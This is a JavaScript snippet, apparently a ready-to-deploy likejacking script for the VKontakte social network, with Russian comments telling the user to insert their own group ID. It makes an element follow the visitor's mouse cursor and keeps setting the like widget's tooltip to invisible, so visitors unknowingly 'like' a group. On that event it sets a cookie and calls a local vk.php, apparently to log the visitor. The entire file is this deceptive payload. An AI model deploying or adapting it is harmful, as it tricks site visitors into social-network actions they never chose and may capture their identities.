var like_id = 4885608; // меняем на свой ID группы

if (getCookie("vk_like_on") !== "true") {
	VK.init({apiId: like_id, onlyWidgets: false});
	VK.Widgets.Like("vk_groups", {type: "button"});

	VK.Observer.subscribe("widgets.like.liked", function f()
	{
		setCookie("vk_like_on", "true", {
			expires: 3600*24*24*10000
		});
		setUser();
	});

	/*VK.Observer.subscribe("widgets.like.unliked", function f()
	{
		setUser();
	});*/

	var el = $('#btn');
	$(window).on('mousemove', function(e) {
		el.css({left:  e.pageX - 90, top:   e.pageY - 12 });
	});

	function setUser() {
		$.getJSON('vk.php', {like_id: like_id}, function(json) {
			$('#vk_widget').hide();
		});
	}
	var iter_iframe = 0;
	// первый аргумент - функция
	function second_passed() {
		if($("#vkwidget1_tt").length > 0) {
			$( "#vkwidget1_tt" ).css( "opacity", "0.0" );
			setTimeout(second_passed, 100);
		} else {
			if (iter_iframe == 10) {
				$('#vk_widget').hide();
			} else	{
				setTimeout(second_passed, 100);
				iter_iframe++;
			}
		}
	}
	setTimeout(second_passed, 100);
} else $('#vk_widget').hide();

function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}

function setCookie(name, value, options) {
  options = options || {};

  var expires = options.expires;

  if (typeof expires == "number" && expires) {
    var d = new Date();
    d.setTime(d.getTime() + expires * 1000);
    expires = options.expires = d;
  }
  if (expires && expires.toUTCString) {
    options.expires = expires.toUTCString();
  }

  value = encodeURIComponent(value);

  var updatedCookie = name + "=" + value;

  for (var propName in options) {
    updatedCookie += "; " + propName;
    var propValue = options[propName];
    if (propValue !== true) {
      updatedCookie += "=" + propValue;
    }
  }

  document.cookie = updatedCookie;
}
